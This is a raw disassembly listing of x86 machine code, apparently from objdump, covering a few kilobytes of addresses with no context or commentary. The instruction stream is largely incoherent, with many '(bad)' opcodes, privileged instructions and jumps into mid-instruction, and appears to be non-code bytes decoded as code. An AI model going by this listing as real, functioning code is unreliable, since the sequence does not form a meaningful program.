  4296ac:	xor    al,0xd8
  4296ae:	pop    bp
  4296b0:	lock xor esi,DWORD PTR [ebx]
  4296b3:	lea    esp,[esi+0x1f]
  4296b6:	icebp  
  4296b7:	jb     0x4296bd
  4296b9:	add    al,al
  4296bb:	jge    0x4296c9
  4296bd:	mov    eax,eax
  4296bf:	fsubr  st,st(3)
  4296c1:	pop    ebp
  4296c2:	mov    esi,DWORD PTR [ebx]
  4296c4:	in     al,0x8d
  4296c6:	rcr    DWORD PTR [edi],0xc2
  4296c9:	jb     0x429729
  4296cb:	add    cl,cl
  4296cd:	jge    0x4296db
  4296cf:	mov    edx,DWORD PTR [ebp-0x20]
  4296d2:	in     al,dx
  4296d3:	pop    ebp
  4296d4:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4296d9:	data16 cmp bh,BYTE PTR [ebp+0x0]
  4296dd:	mov    ebp,DWORD PTR [ebx]
  4296df:	fdivr  QWORD PTR [esi+0x668a5d]
  4296e5:	cmp    al,0x33
  4296e7:	mov    si,0x4f7d
  4296eb:	mov    eax,DWORD PTR [eax]
  4296ed:	lock inc ebp
  4296ef:	mov    esi,DWORD PTR [edi]
  4296f1:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4296f8:	clc    
  4296f9:	(bad)  
  4296fa:	cmp    edi,DWORD PTR [ebx]
  4296fc:	je     0x42970d
  4296fe:	push   ebx
  4296ff:	loopne 0x429710
  429701:	dec    ecx
  429703:	mov    ebp,DWORD PTR [eax-0x1c]
  429706:	int    0xf1
  429708:	mov    esi,0x703084d
  42970d:	orps   xmm6,xmm1
  429710:	add    BYTE PTR [ebp+0x66],dh
  429713:	jmp    0x4296e0
  429715:	mov    eax,DWORD PTR [ebx]
  429717:	lock push ebp
  429719:	ror    DWORD PTR [ebp-0x2972feb3],1
  42971f:	or     bh,dl
  429721:	jb     0x429721
  429723:	add    BYTE PTR [ebx-0x1a7487b3],cl
  429729:	loopne 0x42972b
  42972b:	jne    0x429729
  42972d:	data16 add BYTE PTR [esi+eiz*2],dh
  429731:	mov    ecx,ebx
  429733:	data16 ss icebp 
  429736:	add    BYTE PTR [esi],dh
  429738:	data16 add bl,cl
  42973b:	data16 xor dh,dl
  42973e:	add    BYTE PTR [edx],dh
  429740:	data16 add bl,cl
  429743:	enterw 0x4df1,0x19
  429748:	pop    edi
  429749:	jne    0x4296cc
  42974b:	mov    esi,DWORD PTR [edi]
  42974d:	call   0x77b722ee
  429752:	xor    ebp,DWORD PTR [ebx]
  429754:	lea    esp,[esi+0x48]
  429757:	repnz in eax,0x3b
  42975a:	add    BYTE PTR [ebp-0x37],dh
  42975d:	xor    edx,DWORD PTR [ebp-0x15]
  429760:	in     al,dx
  429761:	xor    edx,DWORD PTR [esi+0x40]
  429764:	mov    DWORD PTR [edi],0x338545fc
  42976a:	clc    
  42976b:	add    edi,DWORD PTR [eax]
  42976d:	pop    edi
  42976e:	pushf  
  42976f:	pop    ebx
  429770:	call   0xff439737
  429775:	mov    edi,eax
  429777:	push   ecx
  429778:	pop    es
  429779:	mov    edi,DWORD PTR [ebx]
  42977b:	push   esi
  42977c:	inc    ebx
  42977d:	cld    
  42977e:	js     0x429780
  429780:	popa   
  429781:	data16 (bad) 
  429783:	into   
  429784:	push   0xb900cd36
  429789:	data16 or dh,cl
  42978c:	pop    es
  42978d:	xor    ah,BYTE PTR [esi+0x0]
  429790:	add    bh,al
  429792:	cld    
  429793:	cld    
  429794:	add    BYTE PTR [ebp+0x38c3f866],al
  42979a:	ss pushf 
  42979c:	add    BYTE PTR [esi+0x66],ah
  42979f:	into   
  4297a0:	ret    
  4297a1:	pop    ebp
  4297a2:	add    al,0x57
  4297a4:	add    BYTE PTR [edi-0x723c409a],dh
  4297aa:	add    edi,edi
  4297ac:	jne    0x4297fe
  4297ae:	lea    edx,[ecx+0x1]
  4297b1:	mov    ebx,0xd64ff1
  4297b6:	sar    DWORD PTR [ebx],1
  4297b8:	test   BYTE PTR [ebp+0x30],dh
  4297bb:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4297bf:	push   edi
  4297c0:	xor    BYTE PTR [ebx],0x3b
  4297c3:	mov    esi,ebx
  4297c5:	xor    eax,DWORD PTR [eax-0x3c73879a]
  4297cb:	xor    BYTE PTR [ebp+0x64],al
  4297ce:	pop    ebx
  4297cf:	mov    ebx,0x9c3a37
  4297d4:	je     0x429801
  4297d6:	xor    edi,DWORD PTR [ebx+0x668a33]
  4297dc:	mov    WORD PTR [ebx],?
  4297de:	xor    BYTE PTR [ebx+0x8b4f64],bh
  4297e4:	pop    edi
  4297e5:	cmp    ecx,ecx
  4297e7:	jne    0x42983e
  4297e9:	mov    ebp,esp
  4297eb:	cld    
  4297ec:	push   esi
  4297ed:	pop    ebx
  4297ee:	inc    ebp
  4297ef:	stc    
  4297f0:	aaa    
  4297f1:	test   DWORD PTR [eax+edi*8-0x317af642],ebx
  4297f8:	clc    
  4297f9:	test   dl,dl
  4297fb:	xor    bh,bh
  4297fd:	fs pop si
  429800:	or     bl,al
  429802:	cld    
  429803:	mov    eax,DWORD PTR [eax]
  429805:	push   ecx
  429806:	push   di
  429808:	retf   0x3645
  42980b:	aaa    
  42980c:	add    BYTE PTR [esi+eiz*2+0x3285cabe],bl
  429813:	clc    
  429814:	add    BYTE PTR [ebx+0x66],bl
  429817:	dec    edx
  429819:	mov    edx,DWORD PTR [edi-0x76]
  42981c:	push   edi
  42981d:	add    al,0xb7
  42981f:	xor    al,0xba
  429821:	cmp    al,0x8d
  429823:	je     0x429824
  429825:	mov    edx,DWORD PTR [eax-0x46]
  429828:	push   ecx
  429829:	lea    edi,[ebx+0x504fff]
  42982f:	push   ecx
  429830:	cmp    edx,DWORD PTR [ebx+0x75]
  429833:	mov    ecx,DWORD PTR [ecx+0x723afcbb]
  429839:	add    BYTE PTR [ebx],dh
  42983b:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  429841:	add    BYTE PTR [ebx+esi*1+0x4f64bb30],cl
  429848:	mov    ebx,0x3b3a00
  42984d:	jne    0x42987a
  42984f:	mov    DWORD PTR [ebx+0x728afc],edi
  429855:	xor    esi,DWORD PTR [ebx]
  429857:	mov    edi,DWORD PTR [ebx+0x8d4f33]
  42985d:	push   edi
  42985e:	cmp    esp,ebp
  429860:	jne    0x429862
  429862:	sbb    DWORD PTR [eax],0x8085c3fc
  429868:	clc    
  429869:	inc    ebx
  42986a:	pop    ebx
  42986b:	sti    
  42986c:	add    eax,0xeb8bc075
  429871:	cld    
  429872:	xor    edi,DWORD PTR ds:0xf8c3855e
  429878:	mov    ecx,DWORD PTR [ecx+edx*2]
  42987b:	rol    DWORD PTR [ebp-0x37],0xf
  42987f:	mov    DWORD PTR [eax],ecx
  429881:	inc    edi
  429882:	(bad)  
  429883:	in     eax,0x4
  429885:	add    bh,bh
  429887:	(bad)  
  429888:	mov    esi,0xc38a5e
  42988d:	mov    esi,DWORD PTR [ebx]
  42988f:	push   ecx
  429890:	mov    edi,0xfc4fc7
  429895:	test   DWORD PTR [ebp-0x8],edx
  429898:	data16 cmp bh,al
  42989b:	pushf  
  42989c:	sub    ebp,eax
  42989e:	inc    ebp
  42989f:	(bad)  
  4298a0:	sub    edi,edi
  4298a2:	mov    DWORD PTR [ebx+0x3a03ba08],ecx
  4298a8:	inc    ebp
  4298a9:	add    BYTE PTR [esi+0x2b],ah
  4298ac:	or     bh,BYTE PTR [edx+0xf8ac2]
  4298b2:	cmp    al,0x33
  4298b4:	mov    edi,DWORD PTR [edx+0x44f81]
  4298ba:	(bad)  
  4298bb:	cmp    esi,DWORD PTR [ebx]
  4298bd:	je     0x429877
  4298bf:	push   ebx
  4298c0:	dec    edi
  4298c1:	str    ecx
  4298c4:	cmp    ebp,DWORD PTR [eax+0x75]
  4298c7:	int    0x33
  4298c9:	mov    edi,0x789085f
  4298ce:	mov    eax,DWORD PTR [esp+edi*8]
  4298d1:	add    cl,cl
  4298d3:	data16 add al,0xcb
  4298d6:	push   ebp
  4298d7:	add    ebp,esp
  4298d9:	jne    0x4298c7
  4298db:	(bad)  
  4298dc:	mov    DWORD PTR [ecx],0xd685f7ec
  4298e2:	clc    
  4298e3:	xlat   BYTE PTR ds:[ebx]
  4298e4:	inc    ebp
  4298e5:	mov    edi,DWORD PTR [ecx]
  4298e7:	push   eax
  4298e8:	pushf  
  4298e9:	in     eax,0x8b
  4298eb:	add    ah,ch
  4298ed:	cld    
  4298ee:	push   eax
  4298ef:	add    BYTE PTR [ecx+0x66],dl
  4298f2:	add    eax,0x3672cb
  4298f7:	add    BYTE PTR [ebp+0x66],al
  4298fa:	(bad)  
  4298fb:	retf   
  4298fc:	lock xor al,BYTE PTR [ebp+0x4566f800]
  429903:	retf   
  429904:	cmp    al,0xc8
  429906:	pushf  
  429907:	jge    0x4298d0
  429909:	aaa    
  42990a:	cld    
  42990b:	pushf  
  42990c:	test   DWORD PTR [edi-0x8],ebx
  42990f:	je     0x429956
  429911:	xor    esi,DWORD PTR ds:0x7020840
  429917:	ror    BYTE PTR [ebp-0x37],0x8d
  42991b:	push   ebp
  42991c:	add    esp,ebp
  42991e:	jb     0x4298ab
  429920:	add    BYTE PTR [eax],cl
  429922:	dec    ebp
  429923:	mov    bh,0x81
  429925:	push   esi
  429926:	push   eax
  429927:	adc    DWORD PTR [ecx-0x3b],0x3698ff81
  42992e:	xor    al,BYTE PTR [eax]
  429930:	mov    edx,DWORD PTR [edi+0x10]
  429933:	(bad)  
  429934:	scas   eax,DWORD PTR es:[edi]
  429935:	xor    bh,BYTE PTR [ebx]
  429937:	add    BYTE PTR [edi],cl
  429939:	mov    ebp,ebp
  42993b:	cld    
  42993c:	add    BYTE PTR [ebx],bh
  42993e:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  429942:	dec    ebp
  429943:	or     BYTE PTR [ebx],ch
  429945:	ret    0x458b
  429948:	lock jmp 0x42993c
  42994b:	mov    ecx,DWORD PTR [eax]
  42994d:	or     BYTE PTR [edi],al
  42994f:	mov    ecx,eax
  429951:	xor    DWORD PTR [edx+0x2],0x0
  429955:	mov    bh,0xc1
  429957:	adc    BYTE PTR [eax],dh
  429959:	iret   
  42995a:	inc    ebp
  42995b:	mov    DWORD PTR [ebx],0x4dfff8c5
  429961:	inc    BYTE PTR [ebx]
  429963:	xor    bh,al
  429965:	add    BYTE PTR [ecx],dl
  429967:	data16 adc al,bh
  42996a:	dec    ecx
  42996b:	fisttp WORD PTR [ecx+0x456604c0]
  429971:	add    dh,BYTE PTR ds:0x75e0845
  429977:	ret    0x4d
  42997a:	lea    ecx,[ebx+0x18728301]
  429980:	add    BYTE PTR [ebp+0x45],al
  429983:	cmp    cl,ch
  429985:	pushf  
  429986:	add    bh,al
  429988:	add    al,ch
  42998a:	inc    ebp
  42998b:	test   DWORD PTR [ebx-0x3eba0708],ecx
  429991:	xor    eax,0x781084d
  429996:	push   eax
  429997:	cwde   
  429998:	push   ecx
  429999:	xor    al,BYTE PTR [ecx+0x32f89889]
  42999f:	inc    ebp
  4299a0:	cmp    esp,DWORD PTR [eax]
  4299a2:	jbe    0x429940
  4299a4:	mov    eax,edi
  4299a6:	or     ah,dh
  4299a8:	inc    ebp
  4299a9:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4299af:	cmp    cl,BYTE PTR [ebx-0x74747664]
  4299b5:	in     al,dx
  4299b6:	hlt    
  4299b7:	push   eax
  4299b8:	push   eax
  4299b9:	push   ecx
  4299ba:	push   ecx
  4299bb:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4299c1:	cwde   
  4299c2:	cwde   
  4299c3:	xor    dh,BYTE PTR [edx]
  4299c5:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  4299cb:	or     BYTE PTR [ebp+0x7],al
  4299ce:	mov    eax,ecx
  4299d0:	clc    
  4299d1:	jb     0x429994
  4299d3:	add    BYTE PTR [ebp+0x55],cl
  4299d6:	or     DWORD PTR [edi],0xc251d150
  4299dc:	add    DWORD PTR [ebx+0x320098],0x8b76453b
  4299e6:	mov    edi,eax
  4299e8:	or     cl,al
  4299ea:	inc    ebp
  4299eb:	dec    ebp
  4299ec:	mov    eax,DWORD PTR [ecx+0x514d500c]
  4299f2:	or     WORD PTR [ecx],0x8998
  4299f7:	xor    cl,BYTE PTR [ebx+0x5076fc3b]
  4299fd:	mov    edx,DWORD PTR [ecx+0x8]
  429a00:	mov    eax,DWORD PTR [ebp-0x8]
  429a03:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb268]
  429a0a:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  429a10:	inc    ebp
  429a11:	dec    eax
  429a12:	add    ecx,DWORD PTR [ebx+0x504df0f8]
  429a18:	add    edx,DWORD PTR [ecx-0x8]
  429a1b:	mov    ecx,DWORD PTR [ecx]
  429a1d:	clc    
  429a1e:	or     BYTE PTR [ebp+eax*2+0x45324098],al
  429a25:	mov    ecx,ebp
  429a27:	clc    
  429a28:	(bad)  
  429a29:	popf   
  429a2a:	inc    DWORD PTR [eax]
  429a2c:	ret    0x8b
  429a2f:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  429a35:	mov    edi,esp
  429a37:	hlt    
  429a38:	test   ecx,esi
  429a3a:	clc    
  429a3b:	or     BYTE PTR [ebp+0x7],al
  429a3e:	cmp    ecx,eax
  429a40:	pushf  
  429a41:	jb     0x429a76
  429a43:	add    BYTE PTR [eax-0x3f],al
  429a46:	inc    eax
  429a47:	daa    
  429a48:	inc    ebp
  429a49:	inc    ebp
  429a4a:	xor    eax,0x7f80803
  429a4f:	dec    ebp
  429a50:	cwde   
  429a51:	add    esi,DWORD PTR [edx]
  429a53:	clc    
  429a54:	cmp    DWORD PTR [ecx],ecx
  429a56:	or     al,0x8
  429a58:	add    al,BYTE PTR [ebp+0x2c]
  429a5b:	xor    eax,0x7350845
  429a60:	or     BYTE PTR [ebp+0x7],cl
  429a63:	lea    ebx,[eax-0x748dcdff]
  429a69:	add    BYTE PTR [eax*2-0x74b21438],cl
  429a70:	mov    edx,DWORD PTR [eax]
  429a72:	cld    
  429a73:	dec    ebp
  429a74:	push   eax
  429a75:	sub    edx,DWORD PTR [ecx-0x75]
  429a78:	add    eax,0xf172fc
  429a7d:	or     BYTE PTR [ebp+0x7],cl
  429a80:	add    eax,ecx
  429a82:	or     al,0x72
  429a84:	add    DWORD PTR [eax],eax
  429a86:	mov    ebx,0x29c2c1
  429a8b:	inc    ebp
  429a8c:	mov    eax,DWORD PTR [ebx]
  429a8e:	cmp    eax,0x3004d1c
  429a94:	xbegin 0x66c8268e
  429a9a:	clc    
  429a9b:	or     BYTE PTR [ebp+0x45],al
  429a9e:	cmp    DWORD PTR ds:0x78b089c,esi
  429aa4:	adc    BYTE PTR [ebp+0x45],cl
  429aa7:	lea    eax,[ebp+0x33727501]
  429aad:	add    cl,ch
  429aaf:	inc    ebp
  429ab0:	add    bl,ch
  429ab2:	add    BYTE PTR [ebx+0x45850845],cl
  429ab8:	je     0x429a45
  429aba:	push   ebx
  429abb:	or     al,0x85
  429abd:	dec    ebp
  429abe:	std    
  429abf:	mov    bh,bh
  429ac1:	mov    BYTE PTR [ebp-0x75],al
  429ac4:	mov    edi,eax
  429ac6:	or     al,0x89
  429ac8:	inc    ebp
  429ac9:	clc    
  429aca:	mov    esp,esp
  429acc:	hlt    
  429acd:	call   DWORD PTR [edi-0x37]
  429ad0:	push   eax
  429ad1:	or     al,0x51
  429ad3:	push   ebp
  429ad4:	xor    ebp,esp
  429ad6:	mov    esi,0x457251
  429adb:	cmp    dh,al
  429add:	pushf  
  429ade:	inc    ebp
  429adf:	(bad)  
  429ae0:	mov    edi,eax
  429ae2:	or     al,0x85
  429ae4:	add    al,bh
  429ae6:	inc    eax
  429ae8:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  429aec:	or     ah,bh
  429aee:	inc    eax
  429aef:	push   eax
  429af0:	jmp    0x429b43
  429af2:	mov    eax,DWORD PTR ds:0xe8720c
  429af8:	mov    DWORD PTR [ebp-0x8],eax
  429afb:	jne    0x429b42
  429afd:	jmp    0x429a8a
  429aff:	mov    ebp,DWORD PTR [eax]
  429b01:	clc    
  429b02:	retf   0xff50
  429b05:	push   ecx
  429b06:	mov    DWORD PTR ds:0x757210,eax
  429b0c:	mov    ecx,DWORD PTR [ebp-0x4]
  429b0f:	sub    esp,DWORD PTR [ebx-0x77]
  429b12:	dec    DWORD PTR [eax*4-0x74ca8abb]
  429b19:	or     ah,bh
  429b1b:	pop    es
  429b1c:	ds cwde 
  429b1e:	push   DWORD PTR [edx]
  429b20:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  429b26:	(bad)  
  429b27:	mov    bh,bh
  429b29:	jmp    0x429b17
  429b2b:	leave  
  429b2c:	jne    0x429b36
  429b2e:	call   0x2f9488
  429b33:	in     al,dx
  429b34:	dec    ebp
  429b35:	add    dh,BYTE PTR [ebx]
  429b37:	add    BYTE PTR [ebx],al
  429b39:	inc    ebp
  429b3a:	cmp    edi,DWORD PTR [eax]
  429b3c:	je     0x429ada
  429b3e:	mov    eax,edi
  429b40:	or     al,0xf0
  429b42:	add    BYTE PTR [ebp+0x458bf845],al
  429b48:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  429b4e:	adc    al,0x7
  429b50:	enter  0x9fc0,0xa5
  429b54:	rol    BYTE PTR [eax],0x5e
  429b57:	mov    ecx,ecx
  429b59:	or     al,0xc
  429b5b:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  429b62:	jmp    0x429b63
  429b64:	push   ebp
  429b65:	mov    esp,ebp
  429b67:	cld    
  429b68:	inc    ebp
  429b69:	inc    ebp
  429b6a:	or     DWORD PTR [ecx+0x457dec10],0x0
  429b71:	push   esi
  429b72:	push   esi
  429b73:	mov    edi,0x7af080f
  429b78:	add    bh,al
  429b7a:	test   DWORD PTR [eax+0x3a7320f],ebx
  429b80:	add    BYTE PTR [ecx+0x4540100f],cl
  429b86:	mov    ebp,eax
  429b88:	mov    ebp,edi
  429b8a:	lock call edx
  429b8d:	fcom   DWORD PTR [ebp+0x45]
  429b90:	mov    eax,0x148a8b
  429b95:	push   ecx
  429b96:	enter  0xc145,0x83
  429b9a:	cmp    cl,BYTE PTR [eax]
  429b9c:	add    BYTE PTR [ebp+0x4d],al
  429b9f:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  429ba5:	call   0xffa29714
  429baa:	cmp    eax,DWORD PTR [ebp-0xc]
  429bad:	jmp    DWORD PTR [eax+edx*1-0x4e]
  429bb1:	push   ebp
  429bb2:	(bad)
  429bb5:	std    
  429bb6:	lock push DWORD PTR [edi+0x5d08fcdb]
  429bbd:	inc    ebp
  429bbe:	(bad)  
  429bbf:	call   0xff7c984f
  429bc4:	add    al,BYTE PTR [ebp+0x37]
  429bc7:	xor    esi,DWORD PTR [edi+0x4f50bf03]
  429bcd:	jne    0x429bcf
  429bcf:	(bad)  
  429bd0:	cmp    edi,esp
  429bd2:	jne    0x429c05
  429bd4:	mov    edi,edi
  429bd6:	or     BYTE PTR [ebx-0x307f0b49],cl
  429bdc:	pop    ds
  429bdd:	into   
  429bde:	je     0x429ba1
  429be0:	mov    ebx,DWORD PTR [esi]
  429be2:	or     BYTE PTR [ebp-0x49],al
  429be5:	mov    esp,DWORD PTR [esi-0x77]
  429be8:	mov    esi,0xfc451f0c
  429bed:	mov    eax,DWORD PTR [eax]
  429bef:	or     al,0x66
  429bf1:	sar    bl,0x3b
  429bf4:	xor    esi,DWORD PTR [ebp+0x66]
  429bf7:	xor    ecx,edi
  429bf9:	pop    edi
  429bfa:	adc    bl,BYTE PTR [ebx+0x78]
  429bfd:	ret    0xff
  429c00:	cld    
  429c01:	inc    ebp
  429c02:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  429c08:	cld    
  429c09:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  429c10:	push   0xffffff83
  429c12:	pop    edi
  429c13:	or     BYTE PTR [ebp+0x53],dh
  429c16:	xorps  xmm1,xmm2
  429c19:	test   BYTE PTR [eax+eax*1],bh
  429c1c:	add    BYTE PTR [eax],al
  429c1e:	adc    eax,eax
  429c20:	add    DWORD PTR [eax+edi*2-0xff7b00],0xffffffb7
  429c28:	jmp    DWORD PTR [eax]
  429c2a:	ror    al,0x5e
  429c2d:	inc    ebp
  429c2e:	leave  
  429c2f:	xor    ecx,DWORD PTR [eax]
  429c31:	and    DWORD PTR [ebx-0x3ec90708],ecx
  429c37:	add    ch,al
  429c39:	xor    edi,edi
  429c3b:	xor    DWORD PTR [ebx],0x660033fc
  429c41:	mov    DWORD PTR [ebp-0xc],ecx
  429c44:	pcmpgtw mm0,mm0
  429c47:	add    dl,ah
  429c49:	leave  
  429c4a:	mov    edi,DWORD PTR [esi-0x7d]
  429c4d:	push   ax
  429c4f:	dec    ebp
  429c50:	mov    esi,DWORD PTR [ebx-0x75]
  429c53:	lea    ebp,[eax-0x7c00fffc]
  429c59:	xor    eax,DWORD PTR [eax]
  429c5b:	sysret 
  429c5d:	dec    ebp
  429c5e:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  429c65:	push   WORD PTR [ecx+0x8]
  429c69:	jne    0x429c2c
  429c6b:	ud0    ecx,DWORD PTR [ecx]
  429c6e:	mov    esi,DWORD PTR [edx]
  429c70:	lods   al,BYTE PTR ds:[esi]
  429c71:	add    BYTE PTR [eax],al
  429c73:	data16 (bad) 
  429c75:	iret   
  429c76:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  429c7d:	cli    
  429c7e:	inc    ebp
  429c7f:	cmp    al,0x8d
  429c81:	add    BYTE PTR [esi+0x2d],ah
  429c84:	inc    ebp
  429c85:	pop    ebp
  429c86:	lea    ecx,[edi]
  429c88:	mov    dl,bh
  429c8a:	add    BYTE PTR [edi],cl
  429c8c:	mov    DWORD PTR [eax+eax*8],edi
  429c8f:	mov    ebx,0x3a87
  429c94:	add    BYTE PTR [ebx],ch
  429c96:	inc    ebp
  429c97:	data16 (bad) 
  429c99:	clc    
  429c9a:	int3   
  429c9b:	cmp    eax,DWORD PTR [eax]
  429c9d:	je     0x429c28
  429c9f:	push   0xffffffc8
  429ca1:	pop    edi
  429ca2:	xchg   DWORD PTR [ebp+0x0],eax
  429ca5:	data16 add BYTE PTR [ebp+0x45],cl
  429ca9:	lea    cx,[ebp+0x10]
  429cad:	jb     0x429caf
  429caf:	jmp    0x429c3a
  429cb1:	call   eax
  429cb3:	clc    
  429cb4:	xchg   DWORD PTR [edi+0x1],edi
  429cb7:	mov    eax,DWORD PTR [eax]
  429cb9:	or     BYTE PTR [ebp-0x49],al
  429cbc:	lea    eax,[eax+0x74003154]
  429cc2:	push   edi
  429cc3:	inc    edx
  429cc4:	jge    0x429cc5
  429cc6:	mov    DWORD PTR [edi],ecx
  429cc8:	fdiv   DWORD PTR [edi-0x6]
  429ccb:	inc    DWORD PTR [eax]
  429ccd:	xor    edx,DWORD PTR [eax+0x5f]
  429cd0:	xchg   DWORD PTR [ebx+0x1],ebx
  429cd3:	ret    0x0
  429cd6:	xor    BYTE PTR [ebp-0x51],cl
  429cd9:	cmp    edi,0xf0ff8904
  429cdf:	data16 ror al,0x84
  429ce3:	rol    BYTE PTR [eax],0x3b
  429ce6:	add    al,dh
  429ce8:	dec    eax
  429ce9:	xchg   esp,eax
  429cea:	push   ebx
  429ceb:	jmp    0x429c78
  429ced:	push   ebp
  429cee:	add    esp,ebp
  429cf0:	add    ebp,esp
  429cf2:	mov    edx,DWORD PTR [edi+0x24]
  429cf5:	clc    
  429cf6:	dec    esi
  429cf7:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  429cfd:	cmp    BYTE PTR [ebx],al
  429cff:	jne    0x429c8a
  429d01:	xor    esp,eax
  429d03:	jmp    0x459e86
  429d08:	add    ebp,DWORD PTR [ecx+ecx*4]
  429d0b:	jne    0x429d01
  429d0d:	call   0xffcc9a67
  429d12:	clc    
  429d13:	xchg   edi,eax
  429d14:	sti    
  429d15:	add    DWORD PTR [ebx],eax
  429d17:	add    BYTE PTR [ebp+0x47],bl
  429d1a:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  429d20:	pop    ebp
  429d21:	mov    DWORD PTR [esi-0x48],esi
  429d24:	jmp    0x429d6d
  429d26:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  429d2c:	(bad)  
  429d2e:	cmp    al,0x0
  429d30:	cmp    eax,DWORD PTR [ebp+0x18]
  429d33:	lea    ebx,[ebp-0x56]
  429d36:	jle    0x429d38
  429d38:	jae    0x429cc3
  429d3a:	mov    eax,esp
  429d3c:	call   0xb900:0x8b005587
  429d43:	inc    ebp
  429d44:	push   ebp
  429d45:	lea    ecx,[ebp-0x27ff4f12]
  429d4b:	mov    eax,edi
  429d4d:	int3   
  429d4e:	push   ebp
  429d4f:	xchg   edi,eax
  429d51:	add    esp,ebp
  429d53:	add    BYTE PTR [eax],al
  429d55:	inc    ebp
  429d56:	add    BYTE PTR [ebp+0x8b3255],cl
  429d5c:	cld    
  429d5d:	mov    DWORD PTR [edx],edi
  429d5f:	aam    0x75
  429d61:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  429d67:	mov    DWORD PTR [ebx-0x50],edx
  429d6a:	test   BYTE PTR [ebp-0x1],0xe8
  429d6e:	mov    eax,DWORD PTR [eax]
  429d70:	hlt    
  429d71:	add    al,al
  429d73:	mov    eax,DWORD PTR ds:0x890045a8
  429d79:	dec    DWORD PTR [ebx+0x45fdf0e8]
  429d7f:	inc    DWORD PTR [eax*2+0xf75854d]
  429d86:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  429d8c:	call   0x7298facd
  429d91:	je     0x429df1
  429d93:	js     0x429df4
  429d95:	lock ret 0x7e
  429d99:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  429d9f:	mov    edi,edi
  429da1:	sbb    al,bl
  429da3:	clc    
  429da4:	add    BYTE PTR [ebp-0x73],bh
  429da7:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  429dad:	ror    BYTE PTR [eax],1
  429daf:	dec    ebp
  429db0:	xchg   ebp,eax
  429db1:	mov    edi,edi
  429db3:	in     al,0x8b
  429db5:	jge    0x429d40
  429db7:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  429dbd:	clc    
  429dbe:	pop    esi
  429dbf:	fist   DWORD PTR [ebp+0x5d398b5d]
  429dc5:	clc    
  429dc6:	add    al,0x6e
  429dc8:	mov    eax,DWORD PTR [ebx]
  429dca:	mov    BYTE PTR [ebp+0x0],dl
  429dcd:	mov    edx,DWORD PTR [ebx-0x20]
  429dd0:	adc    esi,DWORD PTR [edi+0x5e005f36]
  429dd6:	add    eax,0x3b3a73
  429ddb:	adc    al,0x89
  429ddd:	pop    eax
  429dde:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  429de2:	ret    0xf08
  429de5:	cmp    al,0x2
  429de7:	mov    DWORD PTR [edx],esi
  429de9:	cld    
  429dea:	add    BYTE PTR [ebp+0x66],dl
  429ded:	add    eax,ebx
  429def:	add    esp,eax
  429df1:	sub    eax,eax
  429df3:	or     BYTE PTR [ecx-0x77f474bb],cl
  429df9:	add    BYTE PTR [eax],al
  429dfb:	mov    DWORD PTR [ebx-0x24],ebx
  429dfe:	push   edi
  429dff:	push   ebp
  429e00:	clc    
  429e01:	add    DWORD PTR [esi+0x1b0100],0x45
  429e08:	out    0xff,eax
  429e0a:	add    edx,DWORD PTR [eax]
  429e0c:	jmp    0x429df6
  429e0e:	cmp    ch,0x43
  429e11:	(bad)  
  429e12:	jmp    0x40c82664
  429e17:	je     0x429da3
  429e19:	mov    eax,DWORD PTR [eax-0x10c78704]
  429e1f:	inc    ebp
  429e20:	add    BYTE PTR [ebx-0x770375],al
  429e26:	add    ah,ch
  429e28:	add    edx,esp
  429e2a:	pop    edi
  429e2b:	pop    ebp
  429e2c:	push   ebp
  429e2d:	inc    ebx
  429e2e:	in     al,dx
  429e2f:	pop    ebp
  429e30:	in     al,dx
  429e31:	cmp    edx,DWORD PTR [edi-0x8]
  429e34:	cmp    BYTE PTR [esp+ebx*4-0x173676a5],dl
  429e3b:	add    al,0x47
  429e3d:	push   ebp
  429e3e:	mov    esp,ebp
  429e40:	in     al,0x45
  429e42:	dec    ebp
  429e43:	push   esi
  429e44:	test   DWORD PTR [eax+0xff010f],esi
  429e4a:	add    BYTE PTR [eax+0xc018b],dh
  429e50:	leave  
  429e51:	inc    ebp
  429e52:	test   al,ch
  429e54:	add    dh,bh
  429e56:	add    bh,bh
  429e58:	dec    ebp
  429e59:	push   cs
  429e5a:	mov    DWORD PTR [ecx],eax
  429e5c:	hlt    
  429e5d:	push   es
  429e5e:	dec    ebp
  429e5f:	leave  
  429e60:	mov    DWORD PTR [eax],ecx
  429e62:	clc    
  429e63:	cmovge eax,ecx
  429e66:	mov    ecx,0x85c2f0
  429e6c:	clc    
  429e6d:	pop    DWORD PTR [ebp+0x1]
  429e70:	aas    
  429e71:	add    BYTE PTR [ebx+ebp*8-0x7582caad],bl
  429e78:	push   esi
  429e79:	add    BYTE PTR [ebp-0x4],al
  429e7c:	mov    DWORD PTR [eax],eax
  429e7e:	cld    
  429e7f:	inc    bp
  429e81:	add    DWORD PTR [edx],edi
  429e83:	rcr    DWORD PTR [ebx+eax*4-0x48f7fd42],0x7
  429e8b:	mov    ebx,0xcd4f68
  429e90:	mov    edi,DWORD PTR [ebx]
  429e92:	or     al,0x75
  429e94:	(bad)  
  429e95:	xor    ecx,ebx
  429e97:	enterw 0x4d01,0x87
  429e9c:	jmp    0x429ea2
  429ea1:	ret    
  429ea2:	inc    ebp
